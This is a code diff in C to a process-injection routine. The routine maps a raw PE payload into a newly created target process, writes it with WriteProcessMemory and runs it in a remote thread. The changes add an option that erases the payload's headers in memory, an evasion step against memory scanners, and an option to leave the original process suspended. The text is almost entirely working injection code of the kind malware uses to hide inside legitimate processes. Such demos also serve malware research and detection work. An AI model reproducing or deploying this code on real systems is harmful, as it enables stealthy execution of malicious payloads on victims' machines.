@@ -82,8 +82,11 @@ inject_PE32:
     targetPath - application where we want to inject
     payload - buffer with raw image of PE that we want to inject
     payload_size - size of the above
+
+    erase_headers - should erase headers of the payload?
+    run_original - should run the original process?
 */
-bool inject_PE32(LPWSTR targetPath, BYTE* payload, SIZE_T payload_size)
+bool inject_PE32(LPWSTR targetPath, BYTE* payload, SIZE_T payload_size, bool erase_headers, bool run_original)
 {
     if (!load_ntdll_functions()) return false;
 
@@ -100,7 +103,7 @@ bool inject_PE32(LPWSTR targetPath, BYTE* payload, SIZE_T payload_size)
         //TODO: support 64 bit
         return false;
     }
-
+    DWORD written = 0;
     const LONG oldImageBase = payload_nt_hdr->OptionalHeader.ImageBase;
     DWORD payloadImageSize = payload_nt_hdr->OptionalHeader.SizeOfImage;
 
@@ -115,6 +118,8 @@ bool inject_PE32(LPWSTR targetPath, BYTE* payload, SIZE_T payload_size)
         return false;
     }
     printf("Allocated remote ImageBase: %p size: %x\n", remoteAddress,  payloadImageSize);
+
+    payload_nt_hdr->OptionalHeader.ImageBase = (DWORD) remoteAddress;
 
     //first we will prepare the payload image in the local memory, so that it will be easier to edit it, apply relocations etc.
     //when it will be ready, we will copy it into the space reserved in the target process
@@ -139,7 +144,13 @@ bool inject_PE32(LPWSTR targetPath, BYTE* payload, SIZE_T payload_size)
         }
     }
     if (!apply_imports(localCopyAddress)) return false;
-    DWORD written = 0;
+
+    // we may erase the payload's headers - at this stage they are no longer needed
+    if (erase_headers) {
+        const DWORD kHdrsSize = payload_nt_hdr->OptionalHeader.SizeOfHeaders;
+        memset(localCopyAddress, 0, kHdrsSize);
+    }
+
     // paste the local copy of the prepared image into the reserved space inside the remote process:
     if (!WriteProcessMemory(pi.hProcess, remoteAddress, localCopyAddress, payloadImageSize, &written) || written != payloadImageSize) {
         printf("[ERROR] Could not paste the image into remote process!\n");
@@ -153,7 +164,9 @@ bool inject_PE32(LPWSTR targetPath, BYTE* payload, SIZE_T payload_size)
     run_injected_in_new_thread(pi.hProcess, newEP);
 
     //we may also run the original program
-    ResumeThread(pi.hThread);
+    if (run_original) {
+        ResumeThread(pi.hThread);
+    }
 
     //free the handles
     CloseHandle(pi.hThread);
